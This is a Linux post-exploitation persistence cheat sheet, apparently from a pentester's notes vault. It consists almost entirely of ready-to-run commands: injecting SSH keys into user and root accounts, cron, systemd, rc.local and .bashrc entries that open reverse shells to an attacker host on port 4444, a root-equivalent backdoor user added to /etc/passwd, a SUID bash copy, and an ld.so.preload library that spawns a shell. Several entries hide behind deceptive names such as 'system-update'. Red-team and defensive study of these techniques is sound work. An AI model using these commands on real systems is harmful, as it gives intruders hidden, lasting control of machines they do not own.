# Linux Persistence

**Tags:** #persistence #linux #post-exploitation
**Phase:** Post-PrivEsc → Sustained Access

---

## SSH Key Injection (Most Reliable)

```bash
# Add attacker's public key to target user
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo "ssh-rsa AAAA...KALI_PUBKEY kali@kali" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Root persistence
mkdir -p /root/.ssh && chmod 700 /root/.ssh
echo "ssh-rsa AAAA...KALI_PUBKEY" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Connect back
ssh -i kali_private_key user@$TARGET
```

## Cron Jobs

```bash
# User cron (runs as current user)
crontab -e
(crontab -l; echo "* * * * * bash -i >& /dev/tcp/$LHOST/4444 0>&1") | crontab -

# System cron (requires root)
echo "* * * * * root bash -c 'bash -i >& /dev/tcp/$LHOST/4444 0>&1'" >> /etc/crontab
echo "* * * * * root /tmp/.beacon.sh" >> /etc/cron.d/system-update

# /etc/cron.daily (runs as root daily)
echo '#!/bin/bash
bash -i >& /dev/tcp/$LHOST/4444 0>&1' > /etc/cron.daily/.updater
chmod +x /etc/cron.daily/.updater
```

## Systemd Service (Survives Reboot)

```bash
cat > /etc/systemd/system/system-update.service << 'SVCEOF'
[Unit]
Description=System Update Service
After=network.target

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/LHOST/4444 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
SVCEOF

systemctl enable system-update.service
systemctl start system-update.service
```

## /etc/rc.local

```bash
# Add before 'exit 0'
echo 'bash -c "bash -i >& /dev/tcp/$LHOST/4444 0>&1" &' >> /etc/rc.local
chmod +x /etc/rc.local
```

## ~/.bashrc / ~/.bash_profile (User Login)

```bash
echo 'bash -i >& /dev/tcp/$LHOST/4444 0>&1' >> ~/.bashrc
echo '(nohup bash -i >& /dev/tcp/$LHOST/4444 0>&1 &)' >> ~/.bash_profile
```

## Writable /etc/passwd (Add Root User)

```bash
openssl passwd -1 -salt pwn "hacked"
echo 'backdoor:$1$pwn$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
```

## SUID Backdoor

```bash
cp /bin/bash /tmp/.bash_backdoor
chmod +s /tmp/.bash_backdoor

# Execute later
/tmp/.bash_backdoor -p  # -p preserves SUID context
```

## Library Hijack (/etc/ld.so.preload)

```bash
# Runs on every dynamically-linked binary execution
cat > /tmp/evil.c << 'CEOF'
#include <stdio.h>
#include <stdlib.h>
void __attribute__((constructor)) init() {
    system("bash -i >& /dev/tcp/LHOST/4444 0>&1");
}
CEOF
gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c
echo "/tmp/evil.so" > /etc/ld.so.preload
```

## Related Notes

- [[08-Persistence/Windows-Persistence]] — Windows persistence
- [[09-Covering-Tracks/Linux-Log-Removal]] — Cover traces
